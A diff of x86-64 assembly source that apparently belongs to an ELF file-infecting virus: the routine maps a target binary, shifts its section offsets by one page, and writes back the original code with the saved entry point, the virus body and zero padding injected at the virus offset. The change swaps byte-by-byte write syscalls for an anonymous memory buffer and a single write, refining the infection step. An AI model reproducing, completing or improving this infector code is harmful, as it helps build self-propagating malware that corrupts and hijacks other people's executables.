@@ -3,9 +3,9 @@ section .text
 	extern _string
 
 _update_mmaped_file:
-	enter 128, 0
+	enter 256, 0
 	; rsp + 0  mmap start address (ehdr)
-	; rsp + 8  mmap size
+	; rsp + 8  file size
 	; rsp + 16 virus size
 	; rsp + 24 fd
 	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
@@ -18,6 +18,8 @@ _update_mmaped_file:
 	; rsp + 88 number of 0 bytes to add
 	; rsp + 96 i
 	; rsp + 104 = 0
+	; rsp + 108 mmap_tmp addr
+	; rsp + 116 index mmap_tmp
 	;;;;;;;;;;;;;;;;;;;;;
 
 	mov QWORD [rsp], rdi
@@ -138,7 +140,7 @@ _init_treat_all_sections:
 _treat_all_sections:
 	mov r10, QWORD [rsp + 48]
 	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
-	jge _write_in_fd
+	jge _init_mmap_tmp
 
 _if_offset_equal_virus_offset:
 	xor r10, r10
@@ -170,59 +172,175 @@ _inc_jmp_loop_sections:
 	add QWORD [rsp + 40], 0x40
 	jmp _treat_all_sections
 
-_write_in_fd:
+_init_mmap_tmp:
 	mov r10, QWORD [rsp] ; add PAGESIZE to sections offset
 	add r10, 40
 	add QWORD [r10], 4096
-; write(fd, map, virus_offset);
-	mov rax, 1
-	mov rdi, QWORD [rsp + 24] ; fd
-	mov rsi, QWORD [rsp] ; buff
-	mov rdx, QWORD [rsp + 72] ; size
+;;;;;;;;;;;;;;;;;
+; mmap tmp
+	mov rax, 9
+	mov rdi, 0
+	mov rsi, QWORD [rsp + 8]
+	add rsi, 4096
+	mov rdx, 3
+	mov r10, 34
+	mov r8, -1
+	mov r9, 0
 	syscall
-; write(fd, o_entry, 8);
-	mov rax, 1
-	mov rdi, QWORD [rsp + 24] ; fd
-	mov rsi, rsp ; buff
+	cmp rax, 0
+	jle _end
+	mov QWORD [rsp + 108], rax
+	mov QWORD [rsp + 116], 0
+
+_write_in_tmp_map:
+;; write(fd, map, virus_offset);
+	mov rdi, QWORD [rsp + 108]
+	mov rsi, QWORD [rsp]
+	mov rcx, QWORD [rsp + 72]
+	cld
+	rep movsb
+	mov r10, QWORD [rsp + 72]
+	mov QWORD [rsp + 116], r10
+;; write(fd, o_entry, 8);
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	mov rsi, rsp ; 
 	add rsi, 80
-	mov rdx, 8 ; size
-	syscall
-; write(fd, virus, virus_size);
-	mov rax, 1
-	mov rdi, QWORD [rsp + 24] ; fd
-	lea rsi, [rel _string] ; buff
-	mov rdx, QWORD [rsp + 16] ; size
-	syscall
+	mov rcx, 8 ; size
+	cld
+	rep movsb
+	add QWORD [rsp + 116], 8
+;; write(fd, virus, virus_size);
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	lea rsi, [rel _string]
+	mov rcx, QWORD [rsp + 16]
+	cld
+	rep movsb
+	mov r10, QWORD [rsp + 16]
+	add QWORD [rsp + 116], r10
 ; for i < 4096 - (virus_size + 8) write(fd, &(0), 1);
 	mov QWORD [rsp + 88], 4096
 	mov rdi, QWORD [rsp + 16]
 	add rdi, 8
 	sub QWORD [rsp + 88], rdi
-	mov QWORD [rsp + 96], 0
-	mov QWORD [rsp + 104], 0
-
-_loop:
-	mov rdi, QWORD [rsp + 96]
-	cmp rdi, QWORD [rsp + 88]
-	jge _last_write
-	mov rax, 1
-	mov rdi, QWORD [rsp + 24] ; fd
-	mov rsi, rsp; buff
-	add rsi, 104
-	mov rdx, 1; size
-	syscall
-	inc QWORD [rsp + 96]
-	jmp _loop
-
+	mov rcx, QWORD [rsp + 88]
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	mov rax, 0
+	cld
+	rep stosb
+	mov r10, QWORD [rsp + 88]
+	add QWORD [rsp + 116], r10
 _last_write:
-	mov rax, 1
-	mov rdi, QWORD [rsp + 24] ; fd
+	mov rdi, QWORD [rsp + 108] ; fd
+	add rdi, QWORD [rsp + 116]
 	mov rsi, QWORD [rsp] ; buff
 	add rsi, QWORD [rsp + 72]
-	mov rdx, QWORD [rsp + 8] ; size
+	mov rcx, QWORD [rsp + 8] ; size
 ;	sub rdx, QWORD [rsp + 16]
 ;	sub rdx, 8
-	sub rdx, QWORD [rsp + 72]
+	sub rcx, QWORD [rsp + 72]
+	cld
+	rep movsb
+
+_write_into_file:
+	mov rax, 1
+	mov rdi, QWORD [rsp + 24]
+	mov rsi, QWORD [rsp + 108]
+	mov rdx, QWORD [rsp + 8] 
+	add rdx, 4096
+	syscall
+;	mov QWORD [rsp + 96], 0
+;	mov QWORD [rsp + 104], 0
+
+;_loop:
+;	mov rdi, QWORD [rsp + 96]
+;	cmp rdi, QWORD [rsp + 88]
+;	jge _last_write
+;	mov rdi, QWORD [rsp + 108] ; fd
+;	mov rsi, rsp; buff
+;	add rsi, 104
+;	mov rdx, 1; size
+;	syscall
+;	inc QWORD [rsp + 96]
+;	jmp _loop
+
+;_write_in_fd:
+;	mov r10, QWORD [rsp] ; add PAGESIZE to sections offset
+;	add r10, 40
+;	add QWORD [r10], 4096
+;; write(fd, map, virus_offset);
+;	mov rax, 1
+;	mov rdi, QWORD [rsp + 24] ; fd
+;;	mov rdi, 1
+;	mov rsi, QWORD [rsp] ; buff
+;	mov rdx, QWORD [rsp + 72] ; size
+;	syscall
+;; write(fd, o_entry, 8);
+;	mov rax, 1
+;	mov rdi, QWORD [rsp + 24] ; fd
+;;	mov rdi, 1
+;	mov rsi, rsp ; buff
+;	add rsi, 80
+;	mov rdx, 8 ; size
+;	syscall
+;; write(fd, virus, virus_size);
+;	mov rax, 1
+;	mov rdi, QWORD [rsp + 24] ; fd
+;;	mov rdi, 1
+;	lea rsi, [rel _string] ; buff
+;	mov rdx, QWORD [rsp + 16] ; size
+;	syscall
+;;;;; just for debug
+;;	mov rax, 1
+;;	mov rdi, 1 ; fd
+;;	mov rsi, rsp ; buff
+;;	add rsi, 72
+;;	mov rdx, 8 ; size
+;;	syscall
+;; for i < 4096 - (virus_size + 8) write(fd, &(0), 1);
+;	mov QWORD [rsp + 88], 4096
+;	mov rdi, QWORD [rsp + 16]
+;	add rdi, 8
+;;	mov rdi, 1
+;	sub QWORD [rsp + 88], rdi
+;	mov QWORD [rsp + 96], 0
+;	mov QWORD [rsp + 104], 0
+;
+;_loop:
+;	mov rdi, QWORD [rsp + 96]
+;	cmp rdi, QWORD [rsp + 88]
+;	jge _last_write
+;	mov rax, 1
+;	mov rdi, QWORD [rsp + 24] ; fd
+;;	mov rdi, 1
+;	mov rsi, rsp; buff
+;	add rsi, 104
+;	mov rdx, 1; size
+;	syscall
+;	inc QWORD [rsp + 96]
+;	jmp _loop
+;
+;_last_write:
+;	mov rax, 1
+;	mov rdi, QWORD [rsp + 24] ; fd
+;;	mov rdi, 1
+;	mov rsi, QWORD [rsp] ; buff
+;	add rsi, QWORD [rsp + 72]
+;	mov rdx, QWORD [rsp + 8] ; size
+;	sub rdx, QWORD [rsp + 16]
+;	sub rdx, 8
+;	sub rdx, QWORD [rsp + 72]
+;	syscall
+
+_munmap:
+	mov rax, 11
+	mov rdi, QWORD [rsp + 108]
+	mov rsi, QWORD [rsp + 8]
+	add rsi, 4096
+;	add rsi, QWORD [rsp + 8]
+;	add rsi, 8
 	syscall
 
 _end:
